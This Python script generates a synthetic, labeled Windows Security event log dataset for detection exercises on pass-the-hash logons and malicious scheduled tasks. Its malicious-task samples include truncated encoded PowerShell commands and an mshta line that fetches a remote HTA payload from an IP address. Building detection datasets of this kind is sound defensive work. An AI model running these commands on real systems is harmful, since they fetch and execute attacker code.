"""
Generates windows_security.json — synthetic Windows Security Event Log dataset.
Covers Event IDs: 4624 (logon), 4625 (failed logon), 4688 (process creation),
4698 (scheduled task creation), 7045 (service install) — the full set the
official PS requires this dataset to represent.
Feeds Challenge 1 (Pass-the-Hash) and Challenge 2 (Scheduled Task Creation).
4688 is benign-only noise: no challenge targets it for scoring, it exists
purely so the dataset covers all 5 required event types.

Usage: python3 generate_windows_security.py
Output: ./output/datasets/windows_security.json
"""

import json
import random
import os
from datetime import datetime, timedelta

random.seed(42)  # deterministic — same output every run, required for reproducible scoring

# ------------------------------------------------------------------
# Target size and ratio — change these two numbers, everything else scales
# ------------------------------------------------------------------
TOTAL_ENTRIES = 200
MALICIOUS_RATIO = 0.30

MALICIOUS_TOTAL = round(TOTAL_ENTRIES * MALICIOUS_RATIO)   # 60
BENIGN_TOTAL = TOTAL_ENTRIES - MALICIOUS_TOTAL              # 140

# Split malicious 50/50 across the two challenges this dataset serves
PTH_MALICIOUS = MALICIOUS_TOTAL // 2               # 30 — Challenge 1
TASK_MALICIOUS = MALICIOUS_TOTAL - PTH_MALICIOUS   # 30 — Challenge 2

# Split benign across the 4 event types so no single type dominates.
# Noise categories (legacy/breakglass NTLM, maintenance/backup tasks) are
# themselves EventID 4624/4698 entries, so they're carved out of those
# pools below rather than added on top — otherwise the benign budget
# overflows and starves BENIGN_7045 down to (or past) zero.
BENIGN_4624 = round(BENIGN_TOTAL * 0.35)    # normal logons
BENIGN_4698 = round(BENIGN_TOTAL * 0.30)    # routine scheduled tasks
BENIGN_4625 = round(BENIGN_TOTAL * 0.20)    # failed logon padding
LEGACY_NTLM_NOISE = 8  # legitimate-but-NTLM logons that a naive PtH rule would wrongly flag — see add_legacy_ntlm_noise()
BREAKGLASS_NTLM_NOISE = 4 # legitimate break-glass NTLM network logons
MAINTENANCE_TASK_NOISE = 5 # legitimate IT automation scripts
BACKUP_TASK_NOISE = 5 # legitimate backup task using rundll32
PROCESS_CREATION_NOISE = 8  # benign EventID 4688 — not targeted by any challenge, added only for event-type coverage
BENIGN_4624 -= LEGACY_NTLM_NOISE + BREAKGLASS_NTLM_NOISE
BENIGN_4698 -= MAINTENANCE_TASK_NOISE + BACKUP_TASK_NOISE
BENIGN_7045 = BENIGN_TOTAL - BENIGN_4624 - BENIGN_4698 - BENIGN_4625 - LEGACY_NTLM_NOISE - BREAKGLASS_NTLM_NOISE - MAINTENANCE_TASK_NOISE - BACKUP_TASK_NOISE - PROCESS_CREATION_NOISE

OUT_DIR = "output/datasets"
os.makedirs(OUT_DIR, exist_ok=True)

BASE_TIME = datetime(2026, 7, 25, 8, 0, 0)
USERS = ["jdoe", "priya.k", "svc_backup", "arjun.s", "hr_admin", "finance_bot", "kavya.r", "svc_sql"]
HOSTS = ["WKS-FIN-014", "WKS-HR-002", "SRV-DC-01", "WKS-ENG-118", "SRV-APP-03", "WKS-SALES-009"]

entries = []
idx = 0


def ts(offset_min):
    return (BASE_TIME + timedelta(minutes=offset_min)).strftime("%Y-%m-%dT%H:%M:%SZ")


def next_idx():
    global idx
    idx += 1
    return idx


def _random_logon_id():
    return f"0x{random.randint(0x10000, 0xFFFFFF):x}"


# ------------------------------------------------------------------
# CHALLENGE 1 — Pass-the-Hash
# Signature: EventID 4624, LogonType 3 or 9, NTLM auth, no preceding Kerberos ticket
# ------------------------------------------------------------------
def add_pth_malicious(count):
    for i in range(count):
        entries.append({
            "EventID": 4624,
            "TimeCreated": ts(next_idx()),
            "Computer": random.choice(HOSTS),
            "SubjectUserName": "ANONYMOUS LOGON" if i % 2 == 0 else random.choice(USERS),
            "TargetUserName": random.choice(USERS),
            "LogonType": random.choice([3, 9]),
            "AuthenticationPackageName": "NTLM",
            "LogonProcessName": "NtLmSsp",
            "WorkstationName": "UNKNOWN" if i % 2 == 0 else random.choice(HOSTS),
            "malicious": True,
            "attack_type": "T1550.002"
        })


def add_4624_benign(count):
    """Normal Kerberos/interactive logons — must NOT match the PtH rule."""
    for _ in range(count):
        entries.append({
            "EventID": 4624,
            "TimeCreated": ts(next_idx()),
            "Computer": random.choice(HOSTS),
            "SubjectUserName": random.choice(USERS),
            "TargetUserName": random.choice(USERS),
            "LogonType": random.choice([2, 3, 10]),   # 3 included on purpose — Kerberos AuthPackage keeps it non-matching
            "AuthenticationPackageName": "Kerberos",
            "LogonProcessName": "Kerberos",
            "WorkstationName": random.choice(HOSTS),
            "malicious": False,
            "attack_type": None
        })


# ------------------------------------------------------------------
# CHALLENGE 2 — Scheduled Task Creation
# Signature: EventID 4698, TaskContent references encoded PowerShell / suspicious binary
# ------------------------------------------------------------------
SUSPICIOUS_TASKS = [
    ("\\Microsoft\\Windows\\WinRM\\UpdateTask", "powershell.exe -enc SQBuAHYAbwBrAGUA..."),
    ("\\Updater\\SysCheck", "cmd.exe /c powershell -EncodedCommand JABzAD0A..."),
    ("\\Microsoft\\Windows\\Maintenance\\Cleanup", "rundll32.exe javascript:eval(...)"),
    ("\\Recovery\\BackupSync", "mshta.exe http://185.220.101.5/payload.hta"),
    ("\\Microsoft\\WindowsUpdate\\Refresh", "powershell.exe -enc UwB0AGEAcgB0AC0A..."),
]

BENIGN_TASKS = [
    ("\\Microsoft\\Windows\\Defrag\\ScheduledDefrag", "defrag.exe C: /O"),
    ("\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup", "cleanmgr.exe /sagerun:1"),
    ("\\Adobe\\AdobeAAMUpdater", "AdobeAAMUpdater-1.0.exe"),
    ("\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start", "wuauclt.exe /detectnow"),
    ("\\GoogleUpdateTaskMachineCore", "GoogleUpdate.exe /c"),
]


def add_legacy_ntlm_noise(count):
    """A realistic SOC gotcha: a legacy print server still authenticates via
    NTLM/LogonType 3 for legitimate reasons. A naive Pass-the-Hash rule that
    only checks EventID+LogonType+AuthenticationPackageName will WRONGLY
    flag these every time — the analyst has to add a filter excluding this
    known-legitimate source, exercising real Sigma condition logic
    ('selection and not filter') instead of a single flat match."""
    for _ in range(count):
        entries.append({
            "EventID": 4624,
            "TimeCreated": ts(next_idx()),
            "Computer": "SRV-DC-01",
            "SubjectUserName": "svc_legacyauth",
            "TargetUserName": "svc_legacyauth",
            "LogonType": 3,
            "AuthenticationPackageName": "NTLM",
            "LogonProcessName": "NtLmSsp",
            "WorkstationName": "LEGACY-PRINT-01",
            "SubjectLogonId": _random_logon_id(),
            "malicious": False,
            "attack_type": None
        })

def add_breakglass_ntlm_noise(count):
    for _ in range(count):
        entries.append({
            "EventID": 4624,
            "TimeCreated": ts(next_idx()),
            "Computer": random.choice(HOSTS),
            "SubjectUserName": "svc_breakglass",
            "TargetUserName": "svc_breakglass",
            "LogonType": 3,
            "AuthenticationPackageName": "NTLM",
            "LogonProcessName": "NtLmSsp",
            "WorkstationName": "MAINT-JUMP-01",
            "SubjectLogonId": _random_logon_id(),
            "malicious": False,
            "attack_type": None
        })

def add_task_malicious(count):
    """Cycles through the suspicious-task templates, varying host/user/time per entry
    so repeats don't look like literal duplicates."""
    for _ in range(count):
        task_name, task_content = random.choice(SUSPICIOUS_TASKS)
        entries.append({
            "EventID": 4698,
            "TimeCreated": ts(next_idx()),
            "Computer": random.choice(HOSTS),
            "SubjectUserName": random.choice(USERS),
            "TaskName": task_name,
            "TaskContent": task_content,
            "malicious": True,
            "attack_type": "T1053.005"
        })

def add_task_benign(count):
    for _ in range(count):
        task_name, task_content = random.choice(BENIGN_TASKS)
        entries.append({
            "EventID": 4698,
            "TimeCreated": ts(next_idx()),
            "Computer": random.choice(HOSTS),
            "SubjectUserName": random.choice(USERS),
            "TaskName": task_name,
            "TaskContent": task_content,
            "malicious": False,
            "attack_type": None
        })

def add_maintenance_task_noise(count):
    for _ in range(count):
        entries.append({
            "EventID": 4698,
            "TimeCreated": ts(next_idx()),
            "Computer": random.choice(HOSTS),
            "SubjectUserName": "hr_admin",
            "TaskName": "\\IT\\Audit",
            "TaskContent": "powershell.exe -enc <benign_payload_placeholder>",
            "malicious": False,
            "attack_type": None
        })

def add_backup_task_noise(count):
    for _ in range(count):
        entries.append({
            "EventID": 4698,
            "TimeCreated": ts(next_idx()),
            "Computer": random.choice(HOSTS),
            "SubjectUserName": "svc_backup",
            "TaskName": "\\System\\Backup",
            "TaskContent": "rundll32.exe backup.dll,RunBackup",
            "malicious": False,
            "attack_type": None
        })


# ------------------------------------------------------------------
# Padding — 4625 (failed logon), 4688 (process creation), and 7045
# (service install) for realism/spec coverage. Always benign; none of
# these three event types is targeted by either challenge.
# ------------------------------------------------------------------
BENIGN_PROCESSES = [
    ("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\services.exe", "svchost.exe -k netsvcs"),
    ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "C:\\Windows\\explorer.exe", "chrome.exe"),
    ("C:\\Windows\\System32\\taskhostw.exe", "C:\\Windows\\System32\\svchost.exe", "taskhostw.exe"),
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "C:\\Windows\\explorer.exe", "WINWORD.EXE /n"),
    ("C:\\Windows\\System32\\backgroundTaskHost.exe", "C:\\Windows\\System32\\svchost.exe", "backgroundTaskHost.exe -ServerName:App"),
]


def add_4688_padding(count):
    """Routine process creation — normal application launches and scheduled
    system processes. Not tied to any challenge's ground truth; exists so
    the dataset covers all 5 event types the official PS requires."""
    for _ in range(count):
        new_image, parent_image, command_line = random.choice(BENIGN_PROCESSES)
        entries.append({
            "EventID": 4688,
            "TimeCreated": ts(next_idx()),
            "Computer": random.choice(HOSTS),
            "SubjectUserName": random.choice(USERS),
            "NewProcessName": new_image,
            "ParentProcessName": parent_image,
            "CommandLine": command_line,
            "malicious": False,
            "attack_type": None
        })



def add_4625_padding(count):
    for _ in range(count):
        entries.append({
            "EventID": 4625,
            "TimeCreated": ts(next_idx()),
            "Computer": random.choice(HOSTS),
            "SubjectUserName": random.choice(USERS),
            "TargetUserName": random.choice(USERS),
            "LogonType": random.choice([2, 3]),
            "FailureReason": "%%2313",
            "malicious": False,
            "attack_type": None
        })


def add_7045_padding(count):
    for _ in range(count):
        entries.append({
            "EventID": 7045,
            "TimeCreated": ts(next_idx()),
            "Computer": random.choice(HOSTS),
            "ServiceName": random.choice(["WSearch", "BITS", "wuauserv", "Spooler"]),
            "ImagePath": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
            "StartType": "auto start",
            "malicious": False,
            "attack_type": None
        })


# ------------------------------------------------------------------
# Build the dataset at exactly TOTAL_ENTRIES with MALICIOUS_RATIO applied
# ------------------------------------------------------------------
add_pth_malicious(PTH_MALICIOUS)
add_4624_benign(BENIGN_4624)
add_legacy_ntlm_noise(LEGACY_NTLM_NOISE)
add_breakglass_ntlm_noise(BREAKGLASS_NTLM_NOISE)
add_task_malicious(TASK_MALICIOUS)
add_task_benign(BENIGN_4698)
add_maintenance_task_noise(MAINTENANCE_TASK_NOISE)
add_backup_task_noise(BACKUP_TASK_NOISE)
add_4625_padding(BENIGN_4625)
add_4688_padding(PROCESS_CREATION_NOISE)
add_7045_padding(BENIGN_7045)

random.shuffle(entries)

out_path = f"{OUT_DIR}/windows_security.json"
with open(out_path, "w") as f:
    json.dump({"entries": entries}, f, indent=2)

# ------------------------------------------------------------------
# Verify ratio before moving on — should land close to 30%
# ------------------------------------------------------------------
total = len(entries)
malicious_count = sum(1 for e in entries if e["malicious"])
print(f"windows_security.json: {total} entries")
print(f"  malicious: {malicious_count} ({malicious_count/total*100:.1f}%)")
print(f"  benign:    {total - malicious_count} ({(total - malicious_count)/total*100:.1f}%)")
from collections import Counter
print(f"  EventID breakdown: {dict(sorted(Counter(e['EventID'] for e in entries).items()))}")
print(f"Written to {out_path}")